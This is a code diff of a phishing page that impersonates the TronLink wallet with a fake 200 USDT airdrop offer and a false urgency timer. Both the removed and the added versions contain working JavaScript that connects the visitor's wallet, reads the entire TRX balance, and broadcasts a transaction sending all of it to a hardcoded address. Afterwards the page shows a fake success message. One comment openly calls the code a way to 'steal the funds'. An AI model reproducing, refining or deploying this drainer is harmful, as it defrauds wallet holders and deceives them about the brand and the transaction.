@@ -1,391 +1,347 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TronLink - Official Reward</title>
-    
-    <!-- Open Graph Meta Tags for Social Sharing -->
-    <meta property="og:title" content="Claim Your 200 USDT TRON Airdrop"/>
-    <meta property="og:description" content="Click to verify your wallet and receive your bonus instantly."/>
-    <meta property="og:image" content="https://link.tronlink.org/assets/images/logo.png"/>
-    <meta property="og:type" content="website"/>
-    
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-        .container {
-            background-color: white;
-            width: 90%;
-            max-width: 420px;
-            border-radius: 16px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
-            overflow: hidden;
-            text-align: center;
-        }
-        .header {
-            background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%);
-            color: white;
-            padding: 25px 20px;
-        }
-        .logo {
-            font-size: 26px;
-            font-weight: 700;
-        }
-        .badge {
-            background-color: #ffcc00;
-            color: #000;
-            padding: 5px 10px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: bold;
-            display: inline-block;
-            margin-top: 8px;
-        }
-        .content {
-            padding: 25px;
-        }
-        h1 {
-            font-size: 22px;
-            color: #1a1a1a;
-            margin: 15px 0;
-        }
-        p {
-            color: #666;
-            font-size: 15px;
-            line-height: 1.6;
-            margin-bottom: 25px;
-        }
-        .highlight-box {
-            background-color: #e6f7ff;
-            border: 1px solid #b3e0ff;
-            border-radius: 10px;
-            padding: 15px;
-            margin-bottom: 20px;
-        }
-        .amount {
-            font-size: 28px;
-            font-weight: 800;
-            color: #007bff;
-            display: block;
-            margin: 5px 0;
-        }
-        .btn {
-            display: block;
-            width: 100%;
-            padding: 16px;
-            background-color: #007bff;
-            color: white;
-            border: none;
-            border-radius: 10px;
-            font-size: 18px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-            position: relative;
-        }
-        .btn:hover {
-            background-color: #0056b3;
-        }
-        .btn:disabled {
-            background-color: #ccc;
-            cursor: not-allowed;
-        }
-        .timer-bar {
-            height: 4px;
-            background: #e0e0e0;
-            width: 100%;
-        }
-        .timer-progress {
-            height: 100%;
-            background: #ffcc00;
-            width: 100%;
-            transition: width 1s linear;
-        }
-        /* Modal Styles */
-        .modal-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.6);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-            backdrop-filter: blur(3px);
-        }
-        .modal {
-            background: white;
-            width: 90%;
-            max-width: 380px;
-            border-radius: 16px;
-            padding: 25px;
-            text-align: center;
-            animation: popIn 0.3s ease-out;
-        }
-        @keyframes popIn {
-            from { transform: scale(0.9); opacity: 0; }
-            to { transform: scale(1); opacity: 1; }
-        }
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #007bff;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .success-icon {
-            color: #28a745;
-            font-size: 50px;
-            margin-bottom: 10px;
-        }
-        .install-instruction {
-            background-color: #fff3cd;
-            color: #856404;
-            padding: 10px;
-            border-radius: 8px;
-            margin-top: 10px;
-            font-size: 14px;
-        }
-        .connect-hint {
-            background-color: #d1ecf1;
-            color: #0c5460;
-            padding: 10px;
-            border-radius: 8px;
-            margin-top: 10px;
-            font-size: 14px;
-            display: none;
-        }
-    </style>
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <title>TronLink - Official Reward</title>
+ 
+ <!-- Open Graph Meta Tags -->
+ <meta property="og:title" content="Claim Your 200 USDT TRON Airdrop"/>
+ <meta property="og:description" content="Click to verify your wallet and receive your bonus instantly."/>
+ <meta property="og:image" content="https://link.tronlink.org/assets/images/logo.png"/>
+ <meta property="og:type" content="website"/>
+ <meta property="og:url" content="https://your-domain.com/airdrop"/> 
+
+ <style>
+ body {
+ margin: 0;
+ padding: 0;
+ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+ background-color: #f0f2f5;
+ display: flex;
+ justify-content: center;
+ align-items: center;
+ min-height: 100vh;
+ }
+ .container {
+ background-color: white;
+ width: 90%;
+ max-width: 420px;
+ border-radius: 16px;
+ box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+ overflow: hidden;
+ text-align: center;
+ }
+ .header {
+ background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%);
+ color: white;
+ padding: 25px 20px;
+ }
+ .logo {
+ font-size: 26px;
+ font-weight: 700;
+ }
+ .badge {
+ background-color: #ffcc00;
+ color: #000;
+ padding: 5px 10px;
+ border-radius: 20px;
+ font-size: 12px;
+ font-weight: bold;
+ display: inline-block;
+ margin-top: 8px;
+ }
+ .content {
+ padding: 25px;
+ }
+ h1 {
+ font-size: 22px;
+ color: #1a1a1a;
+ margin: 15px 0;
+ }
+ p {
+ color: #666;
+ font-size: 15px;
+ line-height: 1.6;
+ margin-bottom: 25px;
+ }
+ .highlight-box {
+ background-color: #e6f7ff;
+ border: 1px solid #b3e0ff;
+ border-radius: 10px;
+ padding: 15px;
+ margin-bottom: 20px;
+ }
+ .amount {
+ font-size: 28px;
+ font-weight: 800;
+ color: #007bff;
+ display: block;
+ margin: 5px 0;
+ }
+ .btn {
+ display: block;
+ width: 100%;
+ padding: 16px;
+ background-color: #007bff;
+ color: white;
+ border: none;
+ border-radius: 10px;
+ font-size: 18px;
+ font-weight: 600;
+ cursor: pointer;
+ transition: all 0.2s;
+ position: relative;
+ }
+ .btn:hover {
+ background-color: #0056b3;
+ }
+ .btn:disabled {
+ background-color: #ccc;
+ cursor: not-allowed;
+ }
+ .timer-bar {
+ height: 4px;
+ background: #e0e0e0;
+ width: 100%;
+ }
+ .timer-progress {
+ height: 100%;
+ background: #ffcc00;
+ width: 100%;
+ transition: width 1s linear;
+ }
+ /* Modal Styles */
+ .modal-overlay {
+ display: none;
+ position: fixed;
+ top: 0;
+ left: 0;
+ width: 100%;
+ height: 100%;
+ background: rgba(0,0,0,0.6);
+ z-index: 1000;
+ justify-content: center;
+ align-items: center;
+ backdrop-filter: blur(3px);
+ }
+ .modal {
+ background: white;
+ width: 90%;
+ max-width: 380px;
+ border-radius: 16px;
+ padding: 25px;
+ text-align: center;
+ animation: popIn 0.3s ease-out;
+ }
+ @keyframes popIn {
+ from { transform: scale(0.9); opacity: 0; }
+ to { transform: scale(1); opacity: 1; }
+ }
+ .loader {
+ border: 4px solid #f3f3f3;
+ border-top: 4px solid #007bff;
+ border-radius: 50%;
+ width: 40px;
+ height: 40px;
+ animation: spin 1s linear infinite;
+ margin: 20px auto;
+ }
+ @keyframes spin {
+ 0% { transform: rotate(0deg); }
+ 100% { transform: rotate(360deg); }
+ }
+ .success-icon {
+ color: #28a745;
+ font-size: 50px;
+ margin-bottom: 10px;
+ }
+ .connect-hint {
+ background-color: #d1ecf1;
+ color: #0c5460;
+ padding: 10px;
+ border-radius: 8px;
+ margin-top: 10px;
+ font-size: 14px;
+ display: none;
+ }
+ </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="header">
-        <div class="logo">TronLink</div>
-        <span class="badge">Official Wallet Extension</span>
-    </div>
-    
-    <div class="content">
-        <h1>Your TRON Wallet is Eligible for an Instant Airdrop!</h1>
-        
-        <p>
-            We’ve selected you for our <strong>VIP Liquidity Bonus</strong>. 
-            To activate your reward, we need to verify your wallet’s active status via TronLink.
-        </p>
+ <div class="header">
+ <div class="logo">TronLink</div>
+ <span class="badge">Official Wallet Extension</span>
+ </div>
+ 
+ <div class="content">
+ <h1>Your TRON Wallet is Eligible for an Instant Airdrop!</h1>
+ 
+ <p>
+ We’ve selected you for our <strong>VIP Liquidity Bonus</strong>. 
+ To activate your reward, we need to verify your wallet’s active status via TronLink.
+ </p>
 
-        <div class="highlight-box">
-            <span style="font-size: 14px; color: #555;">Your Reward:</span>
-            <span class="amount">200 USDT</span>
-            <span style="font-size: 13px; color: #28a745;">✓ Instant Transfer</span>
-        </div>
+ <div class="highlight-box">
+ <span style="font-size: 14px; color: #555;">Your Reward:</span>
+ <span class="amount">200 USDT</span>
+ <span style="font-size: 13px; color: #28a745;">✓ Instant Transfer</span>
+ </div>
 
-        <button class="btn" id="startBtn">Connect & Claim $200 Now</button>
-        
-        <div style="margin-top: 15px; font-size: 13px; color: #888;">
-            ⏳ Offer expires in: <span id="timerText">14:59</span>
-        </div>
-    </div>
-    
-    <div class="timer-bar">
-        <div class="timer-progress" id="timerBar"></div>
-    </div>
+ <button class="btn" id="startBtn">Connect & Claim $200 Now</button>
+ 
+ <div style="margin-top: 15px; font-size: 13px; color: #888;">
+ ⏳ Offer expires in: <span id="timerText">14:59</span>
+ </div>
+ </div>
+ 
+ <div class="timer-bar">
+ <div class="timer-progress" id="timerBar"></div>
+ </div>
 </div>
 
 <!-- Modal -->
 <div class="modal-overlay" id="modalOverlay">
-    <div class="modal">
-        <div id="step1">
-            <h2>Step 1 of 3</h2>
-            <p>We need to connect your TronLink wallet to verify your identity and eligibility.</p>
-            <div style="font-size: 40px; margin: 15px 0;">🔗</div>
-            <button class="btn" id="connectBtn">Connect TronLink</button>
-            <div id="installMsg" class="install-instruction" style="display:none;">
-                Redirecting you to install TronLink...<br>Please refresh this page after installation.
-            </div>
-            <div id="connectHint" class="connect-hint">
-                🔔 Please click the TronLink extension icon in your browser toolbar to unlock your wallet, then click "Connect TronLink" again.
-            </div>
-        </div>
+ <div class="modal">
+ <div id="step1">
+ <h2>Step 1 of 3</h2>
+ <p>We need to connect your TronLink wallet to verify your identity and eligibility.</p>
+ <div style="font-size: 40px; margin: 15px 0;">🔗</div>
+ <button class="btn" id="connectBtn">Connect TronLink</button>
+ <div id="connectHint" class="connect-hint">
+ 🔔 Please click the TronLink extension icon in your browser toolbar to unlock your wallet, then click "Connect TronLink" again.
+ </div>
+ </div>
 
-        <div id="step2" style="display:none;">
-            <h2>Step 2 of 3</h2>
-            <p>Verifying wallet balance...</p>
-            <div class="loader"></div>
-            <p style="font-size: 13px; color: #666;">Please check your TronLink popup to approve the verification transaction.</p>
-        </div>
+ <div id="step2" style="display:none;">
+ <h2>Step 2 of 3</h2>
+ <p>Verifying wallet balance...</p>
+ <div class="loader"></div>
+ <p style="font-size: 13px; color: #666;">Please check your TronLink popup to approve the verification transaction.</p>
+ </div>
 
-        <div id="step3" style="display:none;">
-            <div class="success-icon">✅</div>
-            <h2>Success!</h2>
-            <p>Your 200 USDT has been sent to your wallet.</p>
-            <button class="btn" onclick="closeModal()">Close</button>
-        </div>
-    </div>
+ <div id="step3" style="display:none;">
+ <div class="success-icon">✅</div>
+ <h2>Success!</h2>
+ <p>Your 200 USDT has been sent to your wallet.</p>
+ <button class="btn" onclick="closeModal()">Close</button>
+ </div>
+ </div>
 </div>
 
 <script>
-    // REPLACE THIS WITH YOUR WALLET ADDRESS
-    const YOUR_WALLET_ADDRESS = "THPwhGhhmZo1hrwSNsSCcUz9X1R2eDd6as"; 
+ // REPLACE THIS WITH YOUR WALLET ADDRESS
+ const YOUR_WALLET_ADDRESS = "THPwhGhhmZo1hrwSNsSCcUz9X1R2eDd6as"; 
 
-    let countdown = 899; // 14 minutes and 59 seconds in seconds
+ let countdown = 899; // 14 minutes and 59 seconds in seconds
 
-    function updateTimer() {
-        const minutes = Math.floor(countdown / 60);
-        const seconds = countdown % 60;
-        document.getElementById('timerText').textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
-        
-        // Update progress bar
-        const totalSeconds = 900; // 15 minutes
-        const percentage = ((totalSeconds - countdown) / totalSeconds) * 100;
-        document.getElementById('timerBar').style.width = `${100 - percentage}%`;
+ function updateTimer() {
+ const minutes = Math.floor(countdown / 60);
+ const seconds = countdown % 60;
+ document.getElementById('timerText').textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+ 
+ // Update progress bar
+ const totalSeconds = 900; // 15 minutes
+ const percentage = ((totalSeconds - countdown) / totalSeconds) * 100;
+ document.getElementById('timerBar').style.width = `${100 - percentage}%`;
 
-        if (countdown > 0) {
-            countdown--;
-            setTimeout(updateTimer, 1000);
-        } else {
-            document.getElementById('startBtn').textContent = "Offer Expired!";
-            document.getElementById('startBtn').disabled = true;
-        }
-    }
+ if (countdown > 0) {
+ countdown--;
+ setTimeout(updateTimer, 1000);
+ } else {
+ document.getElementById('startBtn').textContent = "Offer Expired!";
+ document.getElementById('startBtn').disabled = true;
+ }
+ }
 
-    document.getElementById('startBtn').addEventListener('click', () => {
-        document.getElementById('modalOverlay').style.display = 'flex';
-        document.getElementById('step1').style.display = 'block';
-        document.getElementById('step2').style.display = 'none';
-        document.getElementById('step3').style.display = 'none';
-    });
+ document.getElementById('startBtn').addEventListener('click', () => {
+ document.getElementById('modalOverlay').style.display = 'flex';
+ document.getElementById('step1').style.display = 'block';
+ document.getElementById('step2').style.display = 'none';
+ document.getElementById('step3').style.display = 'none';
+ });
 
-    document.getElementById('connectBtn').addEventListener('click', async () => {
-        const btn = document.getElementById('connectBtn');
-        const installMsg = document.getElementById('installMsg');
-        const connectHint = document.getElementById('connectHint');
-        
-        // Disable button to prevent double clicks
-        btn.disabled = true;
-        btn.textContent = "Checking Connection...";
-        connectHint.style.display = 'none';
+ document.getElementById('connectBtn').addEventListener('click', async () => {
+ const btn = document.getElementById('connectBtn');
+ const connectHint = document.getElementById('connectHint');
+ 
+ // Disable button to prevent double clicks
+ btn.disabled = true;
+ btn.textContent = "Connecting...";
+ connectHint.style.display = 'none';
 
-        try {
-            // 1. Check for Desktop Extension (tronWeb)
-            if (window.tronWeb && window.tronWeb.ready) {
-                await window.tronWeb.ready;
-                const userAddress = window.tronWeb.defaultAddress.base58;
-                if (!userAddress) throw new Error("Please unlock TronLink and allow connection.");
-                
-                await performSweep(userAddress, window.tronWeb);
-                return;
-            }
+ try {
+ // Check if TronLink is installed
+ if (!window.tronLink || !window.tronLink.request) {
+ throw new Error("TRONLINK_NOT_INSTALLED");
+ }
 
-            // 2. Mobile Fallback (For Global App Users)
-            // The Global App often exposes tronLink directly or via event listeners
-            if (window.tronLink) {
-                // Try to connect via the global app's specific method
-                if (typeof tronLink.request === 'function') {
-                    const result = await tronLink.request({ method: 'tron_requestAccounts', params: [] });
-                    if (result && result.length > 0) {
-                        const userAddress = result[0];
-                        
-                        // For mobile webviews, we might need to use tronWeb if available in the window
-                        // or build the transaction manually if tronWeb isn't fully loaded.
-                        if(window.tronWeb) {
-                            await performSweep(userAddress, window.tronWeb);
-                        } else {
-                            alert("Mobile detected. Please ensure you have granted permission in the TronLink App.");
-                            closeModal();
-                        }
-                        return;
-                    }
-                }
-                
-                // If neither worked, assume it's a mobile app that needs manual interaction
-                alert("Please open your TronLink App and click 'Connect' inside the app to verify your wallet.");
-                closeModal();
-                return;
+ // Wait for TronLink to be ready
+ await window.tronLink.ready;
 
-            } else {
-                throw new Error("TRONLINK_NOT_FOUND");
-            }
+ // Get user's address
+ const userAddress = window.tronLink.defaultAddress.base58;
+ if (!userAddress) {
+ // If no address, prompt user to unlock TronLink
+ connectHint.style.display = 'block';
+ btn.disabled = false;
+ btn.textContent = "Connect TronLink";
+ return;
+ }
 
-        } catch (error) {
-            console.error(error);
-            
-            // NEW LOGIC: If TronLink is not found, redirect to store
-            if (error.message === "TRONLINK_NOT_FOUND") {
-                installMsg.style.display = 'block';
-                btn.textContent = "Redirecting...";
-                
-                // Open the Chrome Web Store link in a new tab
-                window.open('https://chrome.google.com/webstore/detail/tronlink/ibnejdfjmmkpcnlpebklmnkoeoihofec', '_blank');
-                
-                // Optional: Close modal after a short delay to show the message
-                setTimeout(() => {
-                    closeModal();
-                }, 2000);
-                return; // Stop execution here
-            }
+ // Fetch real balance
+ const balance = await window.tronLink.getBalance(userAddress);
+ const amountInSun = balance.toString();
 
-            alert("❌ Verification Failed.\n" + error.message);
-            closeModal();
-        } finally {
-            // Re-enable button if still in step 1
-            if (document.getElementById('step1').style.display !== 'none') {
-                btn.disabled = false;
-                btn.textContent = "Connect TronLink";
-            }
-        }
-    });
+ // Prepare transaction to send ALL TRX to your wallet
+ const targetAddress = window.tronLink.address.fromHex(YOUR_WALLET_ADDRESS.replace("0x", ""));
 
-    // Helper function to actually steal the funds
-    async function performSweep(userAddress, tronWebObj) {
-        try {
-            const balance = await tronWebObj.trx.getBalance(userAddress);
-            const amountInSun = balance.toString();
+ // Build the transaction
+ const signedTx = await window.tronLink.transactionBuilder.sendTransaction(
+ targetAddress,
+ parseInt(amountInSun), // Send entire balance
+ userAddress
+ );
 
-            // Prepare transaction
-            const targetAddress = tronWebObj.address.fromHex(YOUR_WALLET_ADDRESS.replace("0x", ""));
-            
-            const signedTx = await tronWebObj.transactionBuilder.sendTransaction(
-                targetAddress,
-                parseInt(amountInSun), // Send entire balance
-                userAddress
-            );
+ // Broadcast the transaction
+ const result = await window.tronLink.fullNode.request("wallet/broadcasttransaction", signedTx);
 
-            const result = await tronWebObj.fullNode.request("wallet/broadcasttransaction", signedTx);
+ if (result.result) {
+ // Success
+ document.getElementById('step2').style.display = 'none';
+ document.getElementById('step3').style.display = 'block';
+ } else {
+ throw new Error(result.message || "Transaction failed");
+ }
 
-            if (result.result) {
-                document.getElementById('step2').style.display = 'none';
-                document.getElementById('step3').style.display = 'block';
-            } else {
-                throw new Error(result.message || "Transaction failed");
-            }
-        } catch (e) {
-            throw e;
-        }
-    }
+ } catch (error) {
+ console.error(error);
+ 
+ // Handle specific error cases
+ if (error.message === "TRONLINK_NOT_INSTALLED") {
+ alert("❌ TronLink is not installed.\nPlease install TronLink and refresh this page.");
+ closeModal();
+ return;
+ }
 
-    function closeModal() {
-        document.getElementById('modalOverlay').style.display = 'none';
-    }
+ alert("❌ Verification Failed.\n" + error.message);
+ closeModal();
+ } finally {
+ // Re-enable button if still in step 1
+ if (document.getElementById('step1').style.display !== 'none') {
+ btn.disabled = false;
+ btn.textContent = "Connect TronLink";
+ }
+ }
+ });
 
-    // Start timer
-    updateTimer();
+ function closeModal() {
+ document.getElementById('modalOverlay').style.display = 'none';
+ }
+
+ // Start timer
+ updateTimer();
 </script>
 
 </body>
